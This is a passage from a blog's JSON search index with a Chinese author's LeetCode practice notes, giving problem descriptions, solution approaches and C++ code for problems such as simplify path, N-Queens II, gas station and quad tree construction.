结尾。\n- 此外，路径仅包含从根目录到目标文件或目录的路径上的目录（即，不含 `'.'` 或 `'..'`）。\n\n返回简化后得到的 **规范路径** 。\n\n**示例 1：**\n\n```\n输入：path = \"/home/\"\n输出：\"/home\"\n解释：注意，最后一个目录名后面没有斜杠。 \n```\n\n### 思路\n\n用堆栈，遇到`..`就pop，遇到`.`就跳过\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    string simplifyPath(string path) {\n        stack<string>stk;\n        string pushing;\n        while(path[0]=='/'){\n            path=path.substr(1);\n        }\n        while(!path.empty()){\n            while(!path.empty()&&path[0]!='/'){\n                pushing.push_back(path[0]);\n                path=path.substr(1);\n            }\n            if(stk.empty()&&pushing!=\".\"&&pushing!=\"..\"){\n                stk.push(pushing);\n            }else if(!stk.empty()){\n                if(pushing==\"..\"){\n                    stk.pop();\n                }else if(pushing!=\".\"){\n                    stk.push(pushing);\n                }\n            }\n            pushing=\"\";\n            while(!path.empty()&&path[0]=='/'){\n                path=path.substr(1);\n            }\n        }\n        while(!stk.empty()){\n            pushing=\"/\"+stk.top()+pushing;\n            stk.pop();\n        }\n        return pushing==\"\"?\"/\":pushing;\n    }\n};\n```\n\n## 路径总和（简单）\n\n### 题目描述\n\n给你二叉树的根节点 `root` 和一个表示目标和的整数 `targetSum` 。判断该树中是否存在 **根节点到叶子节点** 的路径，这条路径上所有节点值相加等于目标和 `targetSum` 。如果存在，返回 `true` ；否则，返回 `false` 。\n\n**叶子节点** 是指没有子节点的节点。\n\n**示例 1：**\n\n![img](2023-9-21%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0.assets/pathsum1.jpg)\n\n```\n输入：root = [5,4,8,11,null,13,4,7,2,null,null,null,1], targetSum = 22\n输出：true\n解释：等于目标和的根节点到叶节点路径如上图所示。\n```\n\n### 思路\n\n很简单的回溯\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    bool hasPathSum(TreeNode* root, int targetSum) {\n        if(root==NULL)return false;\n        targetSum-=root->val;\n        if(root->left==NULL&&root->right==NULL)return targetSum==0?true:false;\n        return hasPathSum(root->left,targetSum)||hasPathSum(root->right,targetSum);\n    }\n};\n```\n\n## 删除有序数组中的重复项Ⅱ（中等）\n\n### 题目描述\n\n给你一个有序数组 `nums` ，请你**[ 原地](http://baike.baidu.com/item/原地算法)** 删除重复出现的元素，使得出现次数超过两次的元素**只出现两次** ，返回删除后数组的新长度。\n\n不要使用额外的数组空间，你必须在 **[原地 ](https://baike.baidu.com/item/原地算法)修改输入数组** 并在使用 O(1) 额外空间的条件下完成。\n\n### 思路\n\ni从位置0开始，j从位置1开始\n\n分为三个阶段做：\n\n1. 如果i位置的值和j位置的值第一次相等，i和j直接加一（如果i和j不相连的话需要将j位置的值给i+1位置的值），因为需要保留出现超过两次的元素出现两次\n2. 接着进行比较，如果i和j位置还是相等只加j，就代表该值不要，因为之需要保留两次\n3. 遇到不相等的时候，先将j的值赋给i+1，再对i和j进行加1\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int removeDuplicates(vector<int>& nums) {\n        int length=nums.size();\n        int i=0;\n        int j=1;\n        while(j<length){\n            if(nums[j]==nums[i])\n                if(++i!=j++)swap(nums[j-1],nums[i]);\n            while(j<length&&nums[j]==nums[i])j++;\n            if(j<length)swap(nums[j++],nums[++i]);\n        }\n        return i+1;\n    }\n};\n```\n\n## 买卖股票的最佳时机Ⅱ（中等）\n\n### 题目描述\n\n给你一个整数数组 `prices` ，其中 `prices[i]` 表示某支股票第 `i` 天的价格。\n\n在每一天，你可以决定是否购买和/或出售股票。你在任何时候 **最多** 只能持有 **一股** 股票。你也可以先购买，然后在 **同一天** 出售。\n\n返回 *你能获得的 **最大** 利润* 。\n\n### 思路：动态规划\n\n其实相当于买股票就是减钱，卖股票就是加钱，只能先买股票再卖股票，对于每一个时间点，如果前一个时间点有股票，那么该时间点就可以选择留股票或者卖股票，这里没办法通过直接判断该时间点留股票赚钱多还是卖股票赚钱多，所以需要为每个时间点维护两个状态，一个状态用于存储该时间点不留股票，也就是如果该时间点的前一个时间点有股票就卖掉，没有就保持，取二者最大值为该股票能得到的最大现金数，另一个状态用于存储该时间点留股票，也就是如果前一个时间点有股票就保持，没有就买当前时间点的股票，取二者较大值作为该时间点留股票可达到的最大数目金额\n\n买股票就相当于现金减去当前买的股票金额，卖股票就相当于现金加上当前股票金额\n\n用`dp[i][0]`代表该时间点不留股票能达到的最大金额，用`dp[i][1]`来表示该时间点留股票能达到的最大金额，状态更新方程就为\n\n```\ndp[i][0]=max(dp[i-1][0],dp[i-1][1]+price[i]);\ndp[i][1]=max(dp[i-1][1],dp[i-1][0]-price[i]);\n```\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int maxProfit(vector<int>& prices) {\n        int length=prices.size();\n        vector<vector<int>>dp(length,vector<int>(2));\n        dp[0][0]=0;\n        dp[0][1]=-prices[0];\n        for(int i=1;i<length;i++){\n            dp[i][0]=max(dp[i-1][0],dp[i-1][1]+prices[i]);\n            dp[i][1]=max(dp[i-1][1],dp[i-1][0]-prices[i]);\n        }\n        return dp[length-1][0];\n    }\n};\n```\n\n## 用最少数量的箭引爆气球（中等）\n\n### 题目描述\n\n有一些球形气球贴在一堵用 XY 平面表示的墙面上。墙面上的气球记录在整数数组 `points` ，其中`points[i] = [xstart, xend]` 表示水平直径在 `xstart` 和 `xend`之间的气球。你不知道气球的确切 y 坐标。\n\n一支弓箭可以沿着 x 轴从不同点 **完全垂直** 地射出。在坐标 `x` 处射出一支箭，若有一个气球的直径的开始和结束坐标为 `x``start`，`x``end`， 且满足  `xstart ≤ x ≤ x``end`，则该气球会被 **引爆** 。可以射出的弓箭的数量 **没有限制** 。 弓箭一旦被射出之后，可以无限地前进。\n\n给你一个数组 `points` ，*返回引爆所有气球所必须射出的 **最小** 弓箭数* 。\n\n### 思路\n\n先对points进行排序，然后从头开始确定能一次性引爆的气球数，用start，end表示能通过在该范围进行射箭引爆以遍历的气球，如果遇到有气球超过了end，那该气球就没办法一次性引爆，如果有气球没超过end，但是提前结束了，end需要往前移以便能引爆该气球\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int findMinArrowShots(vector<vector<int>>& points) {\n        sort(points.begin(),points.end());\n        int start;\n        int end;\n        int count=0;\n        int i=0;\n        while(i<points.size()){\n            start=INT_MIN;\n            end=INT_MAX;\n            while(i<points.size()&&points[i][0]<=end){\n                start=points[i][0];\n                end=min(points[i][1],end);\n                i++;\n            }\n            count++;\n        }\n        return count;\n    }\n};\n```\n\n## 汇总区间（简单）\n\n### 题目描述\n\n给定一个  **无重复元素** 的 **有序** 整数数组 `nums` 。\n\n返回 ***恰好覆盖数组中所有数字** 的 **最小有序** 区间范围列表* 。也就是说，`nums` 的每个元素都恰好被某个区间范围所覆盖，并且不存在属于某个范围但不属于 `nums` 的数字 `x` 。\n\n列表中的每个区间范围 `[a,b]` 应该按如下格式输出：\n\n- `\"a->b\"` ，如果 `a != b`\n- `\"a\"` ，如果 `a == b`\n\n### 知识点\n\n1. 数字转换成字符串：\n\n   ```c++\n   strNum=to_string(num);\n   ```\n\n### 思路\n\n也就是获取连续数字的头和尾，以此遍历即可\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<string> summaryRanges(vector<int>& nums) {\n        int start=0;\n        int end=0;\n        vector<string>ans;\n        for(int i=0;i<nums.size();i++){\n            start=nums[i];\n            while(i<nums.size()-1&&nums[i+1]==nums[i]+1){\n                i++;\n            }\n            end=nums[i];\n            if(start==end)ans.push_back(to_string(start));\n            else ans.push_back(to_string(start)+\"->\"+to_string(end));\n        }\n        return ans;\n    }\n};\n```\n\n## N皇后Ⅱ（困难）\n\n### 题目描述\n\n**n 皇后问题** 研究的是如何将 `n` 个皇后放置在 `n × n` 的棋盘上，并且使皇后彼此之间不能相互攻击。\n\n给你一个整数 `n` ，返回 **n 皇后问题** 不同的解决方案的数量。\n\n### 知识点\n\n`std::unordered_set` 是 C++ 标准库提供的一个无序集合容器，它基于哈希表实现，允许快速的插入、删除和查找操作。这个容器不会按特定顺序来存储元素，而是按照哈希函数计算的位置进行存储，因此元素的顺序是不确定的。\n\n以下是 `std::unordered_set` 的一些常用方法和使用方法：\n\n1. **插入元素**：\n   - `insert(val)`: 向集合中插入一个元素 `val`。\n2. **删除元素**：\n   - `erase(val)`: 从集合中移除值为 `val` 的元素。\n   - `clear()`: 清空集合，移除所有元素。\n3. **查找元素**：\n   - `find(val)`: 查找值为 `val` 的元素，返回指向该元素的迭代器；如果不存在，则返回集合尾后迭代器（`end()`）。\n4. **大小和容量**：\n   - `size()`: 返回集合中元素的数量。\n   - `empty()`: 检查集合是否为空。\n5. **迭代器**：\n   - `begin()`, `end()`: 返回指向集合第一个元素和尾后的迭代器，用于遍历集合的元素。\n\n### 思路\n\n和之前的N皇后思路几乎一样，不做过多解释了\n\n### 代码\n\n```c++\nclass Solution {\nprivate:\n    int count;\npublic:\n    void putQueens(int& remainN,unordered_set<int>duijiaoLeft,unordered_set<int>duijiaoRight,unordered_set<int>visited,int& n){\n        if(remainN==0){\n            count++;\n            return;\n        }\n        unordered_set<int> modifiedSet;\n        for (const auto& item : duijiaoLeft) {\n            modifiedSet.insert(item - 1);\n        }\n        duijiaoLeft.clear();\n        for (const auto& item : modifiedSet) {\n            duijiaoLeft.insert(item);\n        }\n        modifiedSet.clear();\n        for (const auto& item : duijiaoRight) {\n            modifiedSet.insert(item + 1);\n        }\n        duijiaoRight.clear();\n        for (const auto& item : modifiedSet) {\n            duijiaoRight.insert(item);\n        }\n        for(int i=0;i<n;i++){\n            if(duijiaoLeft.find(i)==duijiaoLeft.end()&&duijiaoRight.find(i)==duijiaoRight.end()&&visited.find(i)==visited.end()){\n                duijiaoLeft.insert(i);\n                duijiaoRight.insert(i);\n                visited.insert(i);\n                putQueens(--remainN,duijiaoLeft,duijiaoRight,visited,n);\n                visited.erase(i);\n                duijiaoLeft.erase(i);\n                duijiaoRight.erase(i);\n                remainN++;\n            }\n        }\n    }\n    int totalNQueens(int n) {\n        unordered_set<int>duijiaoLeft;\n        unordered_set<int>duijiaoRight;\n        unordered_set<int>visited;\n        int remainN=n;\n        putQueens(remainN,duijiaoLeft,duijiaoRight,visited,n);\n        return count;\n    }\n};\n```\n\n\n\n## H指数（中等）\n\n### 题目描述\n\n给你一个整数数组 `citations` ，其中 `citations[i]` 表示研究者的第 `i` 篇论文被引用的次数。计算并返回该研究者的 **`h` 指数**。\n\n根据维基百科上 [h 指数的定义](https://baike.baidu.com/item/h-index/3991452?fr=aladdin)：`h` 代表“高引用次数” ，一名科研人员的 `h` **指数** 是指他（她）至少发表了 `h` 篇论文，并且每篇论文 **至少** 被引用 `h` 次。如果 `h` 有多种可能的值，**`h` 指数** 是其中最大的那个。\n\n### 思路\n\n先对原数组进行排序，我们要找最大值的h就是要满足大于等于h的数大于等于h，所以排序之后我们可以知道大于每个数的数有多少，进行查找最大值即可\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int hIndex(vector<int>& citations) {\n        sort(citations.begin(),citations.end());\n        for(int i=0;i<citations.size();i++)\n            if(citations[i]>=(citations.size()-i))return citations.size()-i;\n        return 0;\n    }\n};\n```\n\n## 加一（简单）\n\n### 题目描述\n\n给定一个由 **整数** 组成的 **非空** 数组所表示的非负整数，在该数的基础上加一。\n\n最高位数字存放在数组的首位， 数组中每个元素只存储**单个**数字。\n\n你可以假设除了整数 0 之外，这个整数不会以零开头。\n\n### 思路\n\n从后往前加，如果遇到加了小于10的直接返回，如果所有都大于等于10，则第一位肯定是1，后面肯定是0\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<int> plusOne(vector<int>& digits) {\n        int n=digits.size();\n        for(int i=digits.size()-1;i>=0;i--){\n            if(++digits[i]<10)return digits;\n            digits[i]-=10;\n        }\n        vector<int>result(n+1,0);\n        result[0]=1;\n        return result;\n    }\n};\n```\n\n## 最后一个单词的长度（简单）\n\n### 题目描述\n\n给你一个字符串 `s`，由若干单词组成，单词前后用一些空格字符隔开。返回字符串中 **最后一个** 单词的长度。\n\n**单词** 是指仅由字母组成、不包含任何空格字符的最大子字符串。\n\n### 思路\n\n直接从后往前遍历即可\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int lengthOfLastWord(string s) {\n        int ans=s.size()-1;\n        while(s[ans]==' ')ans--;\n        for(int i=ans;i>=0;i--)\n            if(s[i]==' ')return ans-i;\n        return ans+1;\n    }\n};\n```\n\n### Pow(x,n)(中等)\n\n### 题目描述\n\n实现 [pow(*x*, *n*)](https://www.cplusplus.com/reference/valarray/pow/) ，即计算 `x` 的整数 `n` 次幂函数（即，`xn` ）。\n\n### 思路\n\n这里有一个比较坑的点，如果直接一个一个x相乘会超时，所以我采取的是幂不断×2，也就是现在算的幂为2，而要求n是4，直接结果乘结果，这样幂就直接是4了，直到最后不能×2时就用递归\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    double myPow(double x, long long n) {\n        int fu=0;\n        if(n<0)\n            fu=1;\n        else if(n==0)\n            return 1;\n        n=abs(n);\n        double ans=x;\n        double nowPow=1;\n        while(n>=nowPow*2){\n            ans*=ans;\n            nowPow*=2;\n        }\n        if(n>=nowPow){\n            ans*=myPow(x,n-nowPow);\n        }\n        if(fu)ans=double(1)/ans;\n        return ans;\n    }\n};\n```\n\n### 建立四叉树（中等）\n\n### 题目描述\n\n给你一个 `n * n` 矩阵 `grid` ，矩阵由若干 `0` 和 `1` 组成。请你用四叉树表示该矩阵 `grid` 。\n\n你需要返回能表示矩阵 `grid` 的 四叉树 的根结点。\n\n四叉树数据结构中，每个内部节点只有四个子节点。此外，每个节点都有两个属性：\n\n- `val`：储存叶子结点所代表的区域的值。1 对应 **True**，0 对应 **False**。注意，当 `isLeaf` 为 **False** 时，你可以把 **True** 或者 **False** 赋值给节点，两种值都会被判题机制 **接受** 。\n- `isLeaf`: 当这个节点是一个叶子结点时为 **True**，如果它有 4 个子节点则为 **False** 。\n\n```\nclass Node {\n    public boolean val;\n    public boolean isLeaf;\n    public Node topLeft;\n    public Node topRight;\n    public Node bottomLeft;\n    public Node bottomRight;\n}\n```\n\n我们可以按以下步骤为二维区域构建四叉树：\n\n1. 如果当前网格的值相同（即，全为 `0` 或者全为 `1`），将 `isLeaf` 设为 True ，将 `val` 设为网格相应的值，并将四个子节点都设为 Null 然后停止。\n2. 如果当前网格的值不同，将 `isLeaf` 设为 False， 将 `val` 设为任意值，然后如下图所示，将当前网格划分为四个子网格。\n3. 使用适当的子网格递归每个子节点。\n\n![img](2023-9-21%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0.assets/new_top.png)\n\n如果你想了解更多关于四叉树的内容，可以参考 [wiki](https://en.wikipedia.org/wiki/Quadtree) 。\n\n**四叉树格式：**\n\n你不需要阅读本节来解决这个问题。只有当你想了解输出格式时才会这样做。输出为使用层序遍历后四叉树的序列化形式，其中 `null` 表示路径终止符，其下面不存在节点。\n\n它与二叉树的序列化非常相似。唯一的区别是节点以列表形式表示 `[isLeaf, val]` 。\n\n如果 `isLeaf` 或者 `val` 的值为 True ，则表示它在列表 `[isLeaf, val]` 中的值为 **1** ；如果 `isLeaf` 或者 `val` 的值为 False ，则表示值为 **0** 。\n\n \n\n**示例 1：**\n\n![img](2023-9-21%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0.assets/grid1.png)\n\n```\n输入：grid = [[0,1],[1,0]]\n输出：[[0,1],[1,0],[1,1],[1,1],[1,0]]\n解释：此示例的解释如下：\n请注意，在下面四叉树的图示中，0 表示 false，1 表示 True 。\n```\n\n### 思路\n\n1. 如果该矩阵所有元素都相等，则不需要拆分，直接就是叶子节点\n2. 如果不完全相等，则需要拆分，拆分成四份，再进行判断，用递归方式实现\n\n### 代码\n\n```c++\n/*\n// Definition for a QuadTree node.\nclass Node {\npublic:\n    bool val;\n    bool isLeaf;\n    Node* topLeft;\n    Node* topRight;\n    Node* bottomLeft;\n    Node* bottomRight;\n    \n    Node() {\n        val = false;\n        isLeaf = false;\n        topLeft = NULL;\n        topRight = NULL;\n        bottomLeft = NULL;\n        bottomRight = NULL;\n    }\n    \n    Node(bool _val, bool _isLeaf) {\n        val = _val;\n        isLeaf = _isLeaf;\n        topLeft = NULL;\n        topRight = NULL;\n        bottomLeft = NULL;\n        bottomRight = NULL;\n    }\n    \n    Node(bool _val, bool _isLeaf, Node* _topLeft, Node* _topRight, Node* _bottomLeft, Node* _bottomRight) {\n        val = _val;\n        isLeaf = _isLeaf;\n        topLeft = _topLeft;\n        topRight = _topRight;\n        bottomLeft = _bottomLeft;\n        bottomRight = _bottomRight;\n    }\n};\n*/\n\nclass Solution {\npublic:\n    int ifAll(vector<vector<int>>&grid){\n        for(vector<int>its:grid){\n            for(int it:its){\n                if(it!=grid[0][0])return -1;\n            }\n        }\n        return grid[0][0];\n    }\n    vector<vector<int>> newGridGen(vector<vector<int>>&grid,int length,int i,int j){\n        vector<vector<int>>newGrid(length,vector<int>(length));\n        for(int m=0;m<length;m++){\n            for(int n=0;n<length;n++){\n                newGrid[m][n]=grid[i+m][j+n];\n            }\n        }\n        return newGrid;\n    }\n    Node* construct(vector<vector<int>> grid) {\n        Node* newNode=new Node();\n        int item=ifAll(grid);\n        if(item!=-1){\n            newNode->isLeaf=true;\n            newNode->val=item;\n        }else{\n            int length=grid.size()/2;\n            newNode->topLeft=construct(newGridGen(grid,length,0,0));\n            newNode->topRight=construct(newGridGen(grid,length,0,length));\n            newNode->bottomLeft=construct(newGridGen(grid,length,length,0));\n            newNode->bottomRight=construct(newGridGen(grid,length,length,length));\n        }\n        return newNode;\n    }\n};\n```\n\n## 删除排序链表中的重复元素Ⅱ（中等）\n\n### 题目描述\n\n给定一个已排序的链表的头 `head` ， *删除原始链表中所有重复数字的节点，只留下不同的数字* 。返回 *已排序的链表* 。\n\n \n\n**示例 1：**\n\n![img](2023-9-21%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0.assets/linkedlist1.jpg)\n\n```\n输入：head = [1,2,3,3,4,4,5]\n输出：[1,2,5]\n```\n\n**示例 2：**\n\n![img](2023-9-21%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0.assets/linkedlist2.jpg)\n\n```\n输入：head = [1,1,1,2,3]\n输出：[2,3]\n```\n\n### 思路\n\n在head前再设置一个节点，pre从该节点开始记录，now从head的原始头节点开始记录，如果now和now->next的值相同now就向后走，直到不等，这时now还需要往后走一格，因为now此时还是和前一个节点值相等，接着再和next进行比较，直到now既不和前节点值相同也不和后节点值相同，pre的next就指向now，now就往后走\n\n### 代码\n\n```c++\n/**\n * Definition for singly-linked list.\n * struct ListNode {\n *     int val;\n *     ListNode *next;\n *     ListNode() : val(0), next(nullptr) {}\n *     ListNode(int x) : val(x), next(nullptr) {}\n *     ListNode(int x, ListNode *next) : val(x), next(next) {}\n * };\n */\nclass Solution {\npublic:\n    ListNode* deleteDuplicates(ListNode* head) {\n        ListNode* pre=new ListNode();\n        pre->next=head;\n        ListNode*now=head;\n        head=pre;\n        while(now){\n            while(now&&now->next&&now->val==now->next->val){\n                while(now&&now->next&&now->val==now->next->val){\n                    now=now->next;\n                }\n                if(now){\n                    now=now->next;\n                }\n            }\n            pre->next=now;\n            pre=pre->next;\n            if(now){\n                now=now->next;\n            }\n        }\n        return head->next;\n    }\n};\n```\n\n## 单词搜索（困难）（待做）\n\n## O(1) 时间插入、删除和获取随机元素（中等）\n\n### 题目描述\n\n实现`RandomizedSet` 类：\n\n- `RandomizedSet()` 初始化 `RandomizedSet` 对象\n- `bool insert(int val)` 当元素 `val` 不存在时，向集合中插入该项，并返回 `true` ；否则，返回 `false` 。\n- `bool remove(int val)` 当元素 `val` 存在时，从集合中移除该项，并返回 `true` ；否则，返回 `false` 。\n- `int getRandom()` 随机返回现有集合中的一项（测试用例保证调用此方法时集合中至少存在一个元素）。每个元素应该有 **相同的概率** 被返回。\n\n你必须实现类的所有函数，并满足每个函数的 **平均** 时间复杂度为 `O(1)` 。\n\n### 知识点\n\n1. 生成随机索引\n\n   ```c++\n   #include <iostream>\n   #include <random>\n   #include <unordered_set>\n   \n   int main() {\n       std::unordered_set<char> charSet = {'a', 'b', 'c', 'd', 'e'};\n       if (!charSet.empty()) {\n           // 设置随机数生成器\n           std::random_device rd;\n           std::mt19937 gen(rd());\n           std::uniform_int_distribution<int> dist(0, charSet.size() - 1);\n   \n           int randomIndex = dist(gen); // 生成随机索引\n           std::cout << \"随机索引: \" << randomIndex << std::endl;\n       } else {\n           std::cout << \"集合为空，无法生成随机索引\" << std::endl;\n       }\n   \n       return 0;\n   }\n   \n   ```\n\n   \n\n2. 移动迭代器到哈希列表指定位置：\n\n   ```c++\n          auto it = sets.begin();\n           advance(it, randomIndex); // 移动迭代器到随机位置\n   ```\n\n   \n\n### 思路\n\n利用哈希列表查询元素的1复杂度和用随机数生成随机索引\n\n### 代码\n\n```c++\nclass RandomizedSet {\nprivate:\n    unordered_set<int> sets;\npublic:\n    RandomizedSet() {\n        srand((unsigned)time(NULL));\n     }\n    bool insert(int val) {\n        if (sets.find(val) == sets.end()) {\n            sets.insert(val);\n            return true;\n        }\n        return false;\n    }\n\n    bool remove(int val) {\n        if (sets.find(val) != sets.end()) {\n            sets.erase(val);\n            return true;\n        }\n        return false;\n    }\n    int getRandom() {\n        int randomIndex = rand()%sets.size();; // 生成随机索引\n        auto it = sets.begin();\n        advance(it, randomIndex); // 移动迭代器到随机位置\n        return *it;\n    }\n};\n```\n\n## 加油站（中等）\n\n### 题目描述\n\n在一条环路上有 `n` 个加油站，其中第 `i` 个加油站有汽油 `gas[i]` 升。\n\n你有一辆油箱容量无限的的汽车，从第 `i` 个加油站开往第 `i+1` 个加油站需要消耗汽油 `cost[i]` 升。你从其中的一个加油站出发，开始时油箱为空。\n\n给定两个整数数组 `gas` 和 `cost` ，如果你可以按顺序绕环路行驶一周，则返回出发时加油站的编号，否则返回 `-1` 。如果存在解，则 **保证** 它是 **唯一** 的。\n\n \n\n**示例 1:**\n\n```\n输入: gas = [1,2,3,4,5], cost = [3,4,5,1,2]\n输出: 3\n解释:\n从 3 号加油站(索引为 3 处)出发，可获得 4 升汽油。此时油箱有 = 0 + 4 = 4 升汽油\n开往 4 号加油站，此时油箱有 4 - 1 + 5 = 8 升汽油\n开往 0 号加油站，此时油箱有 8 - 2 + 1 = 7 升汽油\n开往 1 号加油站，此时油箱有 7 - 3 + 2 = 6 升汽油\n开往 2 号加油站，此时油箱有 6 - 4 + 3 = 5 升汽油\n开往 3 号加油站，你需要消耗 5 升汽油，正好足够你返回到 3 号加油站。\n因此，3 可为起始索引。\n```\n\n### 思路\n\n这里我进行了循环，整个循环需要走三步\n\n1. 首先找到第一个gas[i]大于cost[i]的点，这样的点才能作为起点，start定在该点，end为start+1，余额就是gas[start]-cost[start]\n2. 从该点开始，余额加上gas[end]-cost[end]，如果大于等于0，end就往后移，余额继续加\n3. 如果end已经返回到了start，此时分两种情况\n   1. 余额大于0，说明该轮成功，直接返回start的值\n   2. 余额小于0，说明该轮失败，整体就不可能成功，因为最终的余额肯定就是这个值，只是中间的值会不一样\n4. 如果end没有返回到start，此时的余额已经比0小了，start就需要往前移，余额就减去该点加的，直到余额大于0，end才继续后移\n5. 如果start移到了end，此时就需要再往后找符合gas[i]>=cost[i]的点\n\n直到start遍历过所有点都没有找到的话，就说明失败了，就直接返回-1\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int canCompleteCircuit(vector<int>& gas, vector<int>& cost) {\n        int length=gas.size();\n        int start=0;\n        for(;start<length;start++){\n            if(gas[start]>=cost[start])break;\n        }\n        if(start<length){\n            int remain=gas[start]-cost[start];\n            int end=(start+1)%length;\n            while(start<length){\n                while(remain>=0&&end!=start){\n                    remain+=gas[end]-cost[end];\n                    end=(end+1)%length;\n                }\n                if(start==end){\n                    return (remain>=0)?start:-1;\n                }\n                while(remain<0&&start!=end&&start<length){\n                    remain+=cost[start]-gas[start];\n                    start++;\n                }\n                if(start==end){\n                    for(;start<length;start++){\n                        if(gas[start]>=cost[start]){\n                            remain=gas[start]-cost[start];\n                            end=(start+1)%length;\n                            break;\n                        }\n                    }\n                }\n            }\n        }\n        \n        return -1;\n    }\n};\n```\n\n## [到达首都的最少油耗](https://leetcode.cn/problems/minimum-fuel-cost-to-report-to-the-capital/)(中等)\n\n### 题目描述\n\n给你一棵 `n` 个节点的树（一个无向、连通、无环图），每个节点表示一个城市，编号从 `0` 到 `n - 1` ，且恰好有 `n - 1` 条路。`0` 是首都。给你一个二维整数数组 `roads` ，其中 `roads[i] = [ai, bi]` ，表示城市 `ai` 和 `bi` 之间有一条 **双向路** 。\n\n每个城市里有一个代表，他们都要去首都参加一个会议。\n\n每座城市里有一辆车。给你一个整数 `seats` 表示每辆车里面座位的数目。\n\n城市里的代表可以选择乘坐所在城市的车，或者乘坐其他城市的车。相邻城市之间一辆车的油耗是一升汽油。\n\n请你返回到达首都最少需要多少升汽油。\n\n \n\n**示例 1：**\n\n![img](2023-9-21%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0.assets/a4c380025e3ff0c379525e96a7d63a3.png)\n\n```\n输入：roads = [[0,1],[0,2],[0,3]], seats = 5\n输出：3\n解释：\n- 代表 1 直接到达首都，消耗 1 升汽油。\n- 代表 2 直接到达首都，消耗 1 升汽油。\n- 代表 3 直接到达首都，消耗 1 升汽油。\n最少消耗 3 升汽油。\n```\n\n### 思路\n\n可以将题目理解为以下过程，首先从0位置开始，到0位置消耗的总的汽油数等于0相邻的所有点消耗的汽油数加上相邻点到0所消耗的总的汽油数，以此类推就是递归，终止条件是递归到最后的点，该点往前消耗的汽油数就是1，因为该点不能再往后并且该点只有一个代表\n\n每次递归我设置了两个返回值，因为我们既要知道到该点的代表数，又要知道已经消耗了的汽油数\n\n（ps:看到题解将消耗了的汽油数设置成了全局变量，因为每个点实际上只会遍历一次，所以不需要传递这个值，对全局变量进行更新即可）\n\n### 代码\n\n```c++\nclass Solution {\nprivate:\n    unordered_map<int,vector<int>>map;\n    int seatss;\npublic:\n    vector<long long> numberOfRoad(int& pre,int& start){\n        int length=map[start].size();\n        vector<long long>sum(2);//sum[0]是车辆数量，sum[1]是消耗的汽油数量\n        vector<long long>temp(2);\n        for(int &node : map[start]){\n            if(node!=pre){\n                temp=numberOfRoad(start,node);\n                sum[0]+=temp[0];\n                sum[1]+=temp[1];\n            }\n        }\n        if(start==0){\n            return sum;\n        }\n        sum[0]++;\n        sum[1]+=sum[0]/seatss;\n        if(sum[0]%seatss!=0){\n            sum[1]++;\n        }\n        return sum;\n    }\n    long long minimumFuelCost(vector<vector<int>>& roads, int seats) {\n        seatss=seats;\n        for(auto &road : roads){\n            map[road[0]].push_back(road[1]);\n            map[road[1]].push_back(road[0]);\n        } \n        int pre=-1;\n        int start=0;\n        return numberOfRoad(pre,start)[1];\n    }\n};\n```\n\n## 找出字符串的可整除数组（中等）\n\n### 题目描述\n\n给你一个下标从 **0** 开始的字符串 `word` ，长度为 `n` ，由从 `0` 到 `9` 的数字组成。另给你一个正整数 `m` 。\n\n`word` 的 **可整除数组** `div` 是一个长度为 `n` 的整数数组，并满足：\n\n- 如果 `word[0,...,i]` 所表示的 **数值** 能被 `m` 整除，`div[i] = 1`\n- 否则，`div[i] = 0`\n\n返回 `word` 的可整除数组。\n\n \n\n**示例 1：**\n\n```\n输入：word = \"998244353\", m = 3\n输出：[1,1,0,0,0,1,1,0,0]\n解释：仅有 4 个前缀可以被 3 整除：\"9\"、\"99\"、\"998244\" 和 \"9982443\" 。\n```\n\n**示例 2：**\n\n```\n输入：word = \"1010\", m = 10\n输出：[0,1,0,1]\n解释：仅有 2 个前缀可以被 10 整除：\"10\" 和 \"1010\" 。\n```\n\n### 思路\n\n由于此处的word太长，所以只能使用模运算，假设num是将字符转换为数字，则`word=(  (num(word[0])*10)  +  num(word[1])  )*10...+num(word[word.size()-1])`，由`a mod m + b mod m = a+b mod m`，则`num(word) mod m=(num(word[0])*10+num(word[1]))*10... mod m`\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    vector<int> divisibilityArray(string word, int m) {\n        int length=word.size();\n        vector<int> ans(length);\n        long mod=0;\n        for(int i=0;i<length;i++){\n            mod=(mod*10+(word[i]-'0'))%m;\n            ans[i]=mod==0?1:0;\n        }\n        return ans;\n    }\n};\n```\n\n","tags":["c","c++"],"categories":["数据结构"]},{"title":"networks画图学习","url":"/post/8db3fa22.html","content":"\n前言：想要画出花里胡哨的图太难了/(ㄒoㄒ)/~~，想尝试用pathpy画时序网络，调试半天没看懂怎么定义节点大小，想直接用网上的网站传数据但是数据格式好难弄，还是老老实实用networks吧\n\n<!--more-->\n","tags":["python"],"categories":["复杂网络"]},{"title":"leetcode100题_last","url":"/post/3a2a3e16.html","content":"\n2023.09.20：leetcode100题在此完结撒花o(*￣▽￣*)ブ\n\n<!--more-->\n\n## 二叉树中的最大路径和（困难）\n\n### 题目描述\n\n二叉树中的 **路径** 被定义为一条节点序列，序列中每对相邻节点之间都存在一条边。同一个节点在一条路径序列中 **至多出现一次** 。该路径 **至少包含一个** 节点，且不一定经过根节点。\n\n**路径和** 是路径中各节点值的总和。\n\n给你一个二叉树的根节点 `root` ，返回其 **最大路径和** 。\n\n \n\n**示例 1：**\n\n![img](2023-8-29%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0/exx1.jpg)\n\n```\n输入：root = [1,2,3]\n输出：6\n解释：最优路径是 2 -> 1 -> 3 ，路径和为 2 + 1 + 3 = 6\n```\n\n### 知识点\n\n1. 二叉树后序遍历\n\n   ```c++\n       void dfs(TreeNode*root){\n           